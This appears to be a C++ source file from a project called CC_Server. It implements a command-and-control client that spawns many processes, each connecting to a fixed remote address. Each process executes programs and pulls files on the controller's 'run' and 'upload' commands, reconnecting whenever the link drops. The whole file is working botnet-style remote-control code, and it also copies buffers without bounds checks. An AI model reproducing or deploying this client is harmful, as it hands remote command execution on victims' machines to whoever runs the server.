/*
Copyright (C) 2019 Vrend

This file is part of CC_Server.

CC_Server is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

CC_Server is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
long with CC_Server.  If not, see <https://www.gnu.org/licenses/>.
*/

#include "client.h"

bool running;
int port, client_count;
int res;

int main(int argc, char** argv) {

	if(argc != 3) {
		cout << "Invalid arguments" << endl;
		return 1;
	}

	port = atoi(argv[1]);

	client_count = atoi(argv[2]);

	running = true;

	if(port <= 0 || client_count < 0) {
		cout << "Invalid arguments" << endl;
		return 1;
	}

	signal(SIGINT, signal_handler);

	int i = 0;

	while(client_count > 0) {
		res = fork();
		if(res == 0) {
			run_client();
			exit(0);
		}
		else {
			client_count--;
		}
	}

	while(running);
	cout << "\nclosing clients" << endl;
	return 0;
}

void signal_handler(int sig) {
	exit(0);
}

int run_client() {

	signal(SIGINT, signal_handler);

	int fd;

	struct sockaddr_in addr;

	char buffer[1024];

	reconnect:
	fd = socket(AF_INET, SOCK_STREAM, 0);

	int optval = 1;
	int optsize = sizeof(optval);
	int set_sock_opt = setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &optval, optsize);
	int optval2 = 300;
	int optsize2 = sizeof(optval2);
	int set_keep_alive_time = setsockopt(fd, SOL_TCP, TCP_KEEPIDLE, &optval2, optsize2);

	if(set_sock_opt < 0 || set_keep_alive_time < 0) {
		cout << "Failed to set KEEP_ALIVE for client socket" << endl;
		close(fd);
		return 1;
	}

	if(fd < 0) {
		cout << "Error opening socket" << endl;
		return 1;
	}

	memset(&addr, '0', sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if(inet_pton(AF_INET, remote_ip, &addr.sin_addr) <= 0) {
		cout << "Bad address" << endl;
		close(fd);
		return 1;
	}

	while(true) {
		res = connect(fd, (struct sockaddr*) &addr, sizeof(addr));
		if(res < 0) {
			cout << "Connection failed...Terminating" << endl;
			sleep(5);
		}
		else {
			cout << "Successfully connected...." << endl;
			break;
		}
	}

	while(running) {
		bzero(buffer, 1024);
		res = read(fd, buffer, 1023);

		if(res < 0) {
			cout << "Error reading from socket" << endl;
			close(fd);
			goto reconnect;
		}

		string tokens[20];

		char test_buffer[1024];

		strcpy(test_buffer, buffer);

		tokenize(test_buffer, tokens);

		if(tokens[0].compare("run") == 0) {
			// cout << tokens[0] << endl;
			// cout << tokens[1] << endl;
			cout << "running program..." << endl;
			command_run(buffer);
		}
		else if(tokens[0].compare("upload") == 0) {
			get_file(const_cast<char*>(tokens[1].c_str()), fd);
		}
		else {
			cout << buffer << endl;
		}
		bzero(buffer, 1024);
		strcpy(buffer, "Task completed...");
		res = write(fd, buffer, 1023);
		if(res < 0) {
			cout << "Error writing to socket" << endl;
			close(fd);
			goto reconnect;
		}

	}

	close(fd);
	return 0;
}
